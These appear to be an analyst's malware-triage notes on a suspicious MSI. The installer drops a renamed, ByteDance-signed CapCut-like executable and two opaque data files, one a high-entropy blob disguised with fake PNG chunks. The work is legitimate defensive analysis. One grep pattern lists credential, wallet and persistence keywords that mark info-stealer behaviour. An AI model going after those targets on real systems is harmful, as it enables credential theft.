msi_full/S3cwB5EdKcaF4u5M: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 6 sections
msi_full/Pm7KFbOWP5: data
msi_full/viM6fon1J7MG1Wb: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 6 sections
msi_full/GkCaSpXcg95SIo8m: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 7 sections
msi_full/iXzxVqBqNYNtJjOM5gz: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 8 sections
msi_full/US8yBGmyj: data
msi_full/Y8p1Gq0n7iNF: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 6 sections
msi_full/m7mvr72L: PE32+ executable for MS Windows 10.00 (DLL), x86-64, 7 sections
msi_full/Ba4sctKCvu: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 6 sections
msi_full/P0kk0eAnsGQS: PE32+ executable for MS Windows 6.00 (GUI), x86-64, 6 sections
msi_full/QAZX2o5H: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 6 sections
msi_full/t0Mhrk0VAbsv: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 9 sections
msi_full/DEWTud3JSrCytqK: PE32+ executable for MS Windows 5.02 (DLL), x86-64, 6 sections
msi_full/ICnGNGxT: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 8 sections
msi_full/Oj7QkJVzat8: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 7 sections
msi_full/hG3vvZDdOfpOjoWGpiXU: PE32+ executable for MS Windows 6.00 (DLL), x86-64, 6 sections

we'll also check if the MSI itself contains readable strings about install actions:
strings -a UICBDMW.msi | grep -Ei "CustomAction|CapCut|Run|Startup|Registry|Shortcut|msiexec|cmd.exe|powershell|ProgramData|AppData|ByteDance|CapCut.exe" | head -200

this output suggests the MSI is a minmal instaler wrapper around CapCut-like files,
with one custom action that likely launches the installed EXE 

from MSI strings:
ProductName Sizarship
Manufacturer Veil Patron 
ProductVersion 10.7.7.0 

the MSI has:
CustomAction
LaunchFile 

with the file table showing the main EXE is installed as:
EPixe20.exe (renamed from CapCut.exe)

likely behavior is:
Install files into LocalAppDataFolder\Teel
→ launch EPixe20.exe

so we should look into EPixe20.exe / P0kk0eAnsGQS, plus the two data files:                                           ++

Pm7KFbOWP5 → buffer-layer.tmp
US8yBGmyj → tracker32.bin

we'll run strings -a msi_full/P0kk0eAnsGQS | grep -Ei "steam|discord|chrome|edge|brave|firefox|wallet|metamask|password|cookie|token|login|telegram|exodus|appdata|localappdata|startup|runonce|schtasks|powershell|cmd.exe|http|https" | head -200

then inspect the two data files:
file msi_full/Pm7KFbOWP5 msi_full/US8yBGmyj
xxd -l 64 msi_full/Pm7KFbOWP5
xxd -l 64 msi_full/US8yBGmyj
strings -a msi_full/Pm7KFbOWP5 | head -100
strings -a msi_full/US8yBGmyj | head -100

and search the MSI for actual custom action details
strings -a UICBDMW.msi | grep -A20 -B20 -Ei "LaunchFile|EPixe20|CustomAction|Teel|Sizarship|Veil Patron"

P0kk0eAnsGQS / installed as EPixe20.exe does not show obvious steam, discord, wallet, cookie, powershell, etc. strings in that grep. It mainly shows user_is_login, a Windows manifest, and DigiCert certificate URLs.

The MSI metadata is fake-looking:

ProductName: Sizarship
Manufacturer: Veil Patron
Install folder: LocalAppDataFolder\Teel
Built with WiX Toolset 4.0.0.0

The file table maps the random cabinet names to real install names:

P0kk0eAnsGQS → EPixe20.exe
GkCaSpXcg95SIo8m → Qt6Core.dll
Y8p1Gq0n7iNF → VEConfig.dll
S3cwB5EdKcaF4u5M → VECrashMonitor.dll
t0Mhrk0VAbsv → VESafeGuard.dll
US8yBGmyj → tracker32.bin
Pm7KFbOWP5 → buffer-layer.tmp

Now we'll try to verify the signer with extract_cert.py

python extract_cert.py msi_full/P0kk0eAnsGQS
openssl pkcs7 -inform DER -in msi_full/P0kk0eAnsGQS.p7b -print_certs -text -noout | grep -Ei "Subject:|Issuer:|Not Before|Not After|Bytedance|CapCut|DigiCert"

and 

python extract_cert.py msi_full/Y8p1Gq0n7iNF
openssl pkcs7 -inform DER -in msi_full/Y8p1Gq0n7iNF.p7b -print_certs -text -noout | grep -Ei "Subject:|Issuer:|Not Before|Not After|Bytedance|CapCut|DigiCert"

both P0kk0eAnsGQS / EPixe20.exe and Y8p1Gq0n7iNF / VEConfig.dll have certificate chains ending in a ByteDance code-signing cert:
Subject: ... O=Bytedance Pte. Ltd., CN=Bytedance Pte. Ltd.
Not Before: Aug 1 2022
Not After : Jul 30 2025

so far 

Suspicious PowerShell-delivered MSI that silently installs a fake-branded/repackaged CapCut/ByteDance application bundle into %LOCALAPPDATA%\Teel, launches EPixe20.exe, and includes two opaque data files: buffer-layer.tmp and tracker32.bin.

checking entropy with 
python - <<'PY'
from pathlib import Path
import math

for p in ["msi_full/Pm7KFbOWP5", "msi_full/US8yBGmyj"]:
    b = Path(p).read_bytes()
    counts = [0]*256
    for x in b:
        counts[x] += 1
    ent = -sum((c/len(b))*math.log2(c/len(b)) for c in counts if c)
    print(p, "size=", len(b), "entropy=", round(ent, 3))
PY

because If entropy is around 7.5–8.0, treat them as packed/encrypted/compressed data. If it is lower, they may be obfuscated text/config/resource data.

Pm7KFbOWP5 / buffer-layer.tmp
size: 9,944 bytes
entropy: 6.849

US8yBGmyj / tracker32.bin
size: 2,279,810 bytes
entropy: 7.913

buffer-layer.tmp has medium entropy suggesting obfuscated text, config, padding, or custom encoded data
tracker32.bin has very high entropy, close to compressed/encrypted/packed data. 
it is also referenced by GkCaSpXcg95SIo8m, which we previously suspected is Qt6core.dll or Qt related/


next well run 

xxd -l 32 msi_full/US8yBGmyj
xxd -s -64 msi_full/US8yBGmyj

check for repeated patterns with:

python - <<'PY'
from pathlib import Path
from collections import Counter

b = Path("msi_full/US8yBGmyj").read_bytes()

print("First 32:", b[:32].hex())
print("Last 32 :", b[-32:].hex())

for n in [1,2,4,8,16]:
    chunks = [b[i:i+n] for i in range(0, min(len(b), 200000), n)]
    common = Counter(chunks).most_common(10)
    print("\nchunk size", n)
    for c, count in common:
        print(c.hex(), count)
PY

and check whether it has an XOR-obfuscated header somewhere:

python - <<'PY'
from pathlib import Path

b = Path("msi_full/US8yBGmyj").read_bytes()
sigs = {
    b"MZ": "PE",
    b"PK\x03\x04": "ZIP",
    b"\x89PNG": "PNG",
    b"\x1f\x8b": "GZIP",
    b"7z\xbc\xaf\x27\x1c": "7Z",
}

for key in range(256):
    decoded = bytes(x ^ key for x in b[:4096])
    for sig, name in sigs.items():
        if decoded.startswith(sig):
            print("possible XOR key", hex(key), "signature", name)
PY

And check which DLL imports file-access APIs:

python - <<'PY'
import os
import pefile

interesting = [
    "CreateFile", "ReadFile", "WriteFile", "MapViewOfFile",
    "LoadLibrary", "GetProcAddress", "VirtualAlloc",
    "Crypt", "BCrypt", "WinHttp", "InternetOpen"
]

for f in os.listdir("msi_full"):
    p = "msi_full/" + f
    try:
        pe = pefile.PE(p)
    except Exception:
        continue

    hits = []
    if hasattr(pe, "DIRECTORY_ENTRY_IMPORT"):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            for imp in entry.imports:
                if imp.name:
                    name = imp.name.decode(errors="ignore")
                    if any(x.lower() in name.lower() for x in interesting):
                        hits.append(name)

    if hits:
        print("\n====", f, "====")
        for h in sorted(set(hits)):
            print(h)
PY

US8yBGmyj / tracker32.bin starts with ASCII-like junk, has high entropy 7.913, and ends with a real-looking PNG trailer:
00000000 ... esttllecynnriipy...
...
49454e44 ae426082

49 45 4E 44 AE 42 60 82 is the standard PNG IEND chunk ending

So tracker32.bin may be:

a PNG/image/resource file with a damaged or custom header,
an obfuscated/encrypted resource blob containing PNG-like data,
or a custom data file with PNG chunks embedded.

he single-byte XOR header test found nothing, so it probably is not simply XOR-obfuscated with one byte at the start.

he import list is also useful: GkCaSpXcg95SIo8m imports CreateFileW, CreateFileMappingW, MapViewOfFile, ReadFile, WriteFile, VirtualAlloc, and it is the file where you saw tracker32.bin

Next: check whether tracker32.bin is a malformed PNG

grep -abo "IHDR\|IDAT\|IEND" msi_full/US8yBGmyj

also 

python - <<'PY'
from pathlib import Path

p = Path("msi_full/US8yBGmyj")
b = p.read_bytes()

for sig in [b"IHDR", b"IDAT", b"IEND"]:
    print(sig.decode(), [hex(i) for i in range(len(b)) if b.startswith(sig, i)][:20])
PY

the pattern found is very png like
many IDAT chunks at regular spacing
IEND at the end
but there is no IHDR, and no normal PNG header at the start 
the file starts with ASCII-looking junk

tracker32.bin is probably either:

a deliberately corrupted/obfuscated PNG-like resource,
a custom resource format that stores PNG IDAT/IEND-style chunks,
or a real PNG with the header/IHDR removed or transformed.

inspect bytes before the first IDAT
xxd -s $((0x4052-32)) -l 96 msi_full/US8yBGmyj

4 bytes length
4 bytes chunk type, e.g. IDAT
<length bytes data>
4 bytes CRC

00004032: 2a6e 6d61 6563 6573 656e 6161 6969 2461  *nmaecesenaaii$a
00004042: 686c 6865 756f 656e 2361 7374 0000 2000  hlheuoen#ast.. .
00004052: 4944 4154 c6a5 79ea 2f38 ec9f 1373 2200  IDAT..y./8...s".
00004062: d06e 3100 e180 ec9b 2f38 e417 3c38 ec97  .n1...../8..<8..
00004072: 50c1 ec9c 2f18 ecd1 2f38 a99f 7b38 af9f  P.../.../8..{8..
00004082: 4338 6cf6 2f5d ecf1 2f4c e8fb 6e2f ecba  C8l./]../L..n/..

Parse chunks from the first IDAT
A PNG IHDR contains width/height as big-endian integers. Since there’s no IHDR, they may have stripped it. You can inspect the first few bytes of the first IDAT data:


python - <<'PY'
from pathlib import Path
import struct

b = Path("msi_full/US8yBGmyj").read_bytes()

pos = b.find(b"IDAT") - 4
print("start candidate:", hex(pos))

for i in range(20):
    if pos < 0 or pos + 8 > len(b):
        break

    length = struct.unpack(">I", b[pos:pos+4])[0]
    ctype = b[pos+4:pos+8]

    print(i, "pos=", hex(pos), "len=", length, "type=", ctype)

    pos = pos + 8 + length + 4
PY

start candidate: 0x404e
0 pos= 0x404e len= 8192 type= b'IDAT'
1 pos= 0x605a len= 8192 type= b'IDAT'
2 pos= 0x8066 len= 8192 type= b'IDAT'
3 pos= 0xa072 len= 8192 type= b'IDAT'
4 pos= 0xc07e len= 7224 type= b'IDAT'
5 pos= 0xdcc2 len= 8192 type= b'IDAT'
6 pos= 0xfcce len= 8192 type= b'IDAT'
7 pos= 0x11cda len= 8192 type= b'IDAT'
8 pos= 0x13ce6 len= 8192 type= b'IDAT'
9 pos= 0x15cf2 len= 8192 type= b'IDAT'
10 pos= 0x17cfe len= 8192 type= b'IDAT'
11 pos= 0x19d0a len= 8192 type= b'IDAT'
12 pos= 0x1bd16 len= 8192 type= b'IDAT'
13 pos= 0x1dd22 len= 8192 type= b'IDAT'
14 pos= 0x1fd2e len= 8192 type= b'IDAT'
15 pos= 0x21d3a len= 8192 type= b'IDAT'
16 pos= 0x23d46 len= 8192 type= b'IDAT'
17 pos= 0x25d52 len= 8192 type= b'IDAT'
18 pos= 0x27d5e len= 8192 type= b'IDAT'
19 pos= 0x29d6a len= 8192 type= b'IDAT'

Try to locate width/height candidates

python - <<'PY'
from pathlib import Path
import struct

b = Path("msi_full/US8yBGmyj").read_bytes()
idat = b.find(b"IDAT")
length = struct.unpack(">I", b[idat-4:idat])[0]
data_start = idat + 4
print("IDAT offset:", hex(idat))
print("length:", length)
print("first 64 data bytes:", b[data_start:data_start+64].hex())
PY

IDAT offset: 0x4052
length: 8192
first 64 data bytes: c6a579ea2f38ec9f13732200d06e3100e180ec9b2f38e4173c38ec9750c1ec9c2f18ecd12f38a99f7b38af9f43386cf62f5decf12f4ce8fb6e2fecba2f79eccf


Carve a fake PNG with guessed IHDR
Try common dimensions, starting with 512x512, 1024x1024, 1920x1080. This script builds PNGs by adding a normal signature and guessed IHDR before the existing IDAT chunks:

python - <<'PY'
from pathlib import Path
import struct, zlib

src = Path("msi_full/US8yBGmyj").read_bytes()
start = src.find(b"IDAT") - 4
chunks = src[start:]

def chunk(t, data):
    return struct.pack(">I", len(data)) + t + data + struct.pack(">I", zlib.crc32(t + data) & 0xffffffff)

def make_png(w, h, name):
    # color type 6 = RGBA, bit depth 8
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 6, 0, 0, 0)
    out = b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunks
    Path(name).write_bytes(out)

for w, h in [(512,512), (1024,1024), (1920,1080), (1080,1920), (2048,2048)]:
    make_png(w, h, f"tracker_guess_{w}x{h}.png")
    print("wrote", f"tracker_guess_{w}x{h}.png")
PY

Then test them with file:
file tracker_guess_*.png

Even without pngcheck, file may tell you whether the structure is recognized

❯ file tracker_guess_*.png
tracker_guess_1024x1024.png: PNG image data, 1024 x 1024, 8-bit/color RGBA, non-interlaced
tracker_guess_1080x1920.png: PNG image data, 1080 x 1920, 8-bit/color RGBA, non-interlaced
tracker_guess_1920x1080.png: PNG image data, 1920 x 1080, 8-bit/color RGBA, non-interlaced
tracker_guess_2048x2048.png: PNG image data, 2048 x 2048, 8-bit/color RGBA, non-interlaced
tracker_guess_512x512.png:   PNG image data, 512 x 512, 8-bit/color RGBA, non-interlaced


validate PNG

python - <<'PY'
from PIL import Image
from pathlib import Path

for p in Path(".").glob("tracker_guess_*.png"):
    try:
        im = Image.open(p)
        im.verify()
        print(p, "OK", im.size, im.mode)
    except Exception as e:
        print(p, "bad:", e)
PY

tracker_guess_1024x1024.png OK (1024, 1024) RGBA
tracker_guess_1920x1080.png OK (1920, 1080) RGBA
tracker_guess_1080x1920.png OK (1080, 1920) RGBA
tracker_guess_2048x2048.png OK (2048, 2048) RGBA
tracker_guess_512x512.png OK (512, 512) RGBA


this confirms tracker32.bin is PNG chunk data with the PNG header and IHDR stripped/replaced.
we found:
0x404e: length = 8192
0x4052: type = IDAT

Then repeated valid-looking IDAT chunks, mostly 8192 bytes each, ending with IEND. The file also validates as PNG once you prepend a guessed PNG signature + IHDR.

checked chunks: 277 bad: 0

So the IDAT / IEND chunk framing is valid, including CRCs. But:

DECOMPRESS FAIL: normal incorrect header check
DECOMPRESS FAIL: raw-deflate invalid block type

means the IDAT data is not normal PNG zlib-compressed image data.

So tracker32.bin is not a valid PNG image, even though it uses PNG-style chunk structure

Most likely possibilities:

Custom container format using PNG chunk layout
length + chunk type + data + CRC
uses IDAT/IEND names to look PNG-like
Encrypted/compressed blob stored inside fake PNG chunks
CRCs are valid because the file was intentionally built this way
high entropy fits this
Data meant to be read by a custom loader
especially since one DLL references tracker32.bin
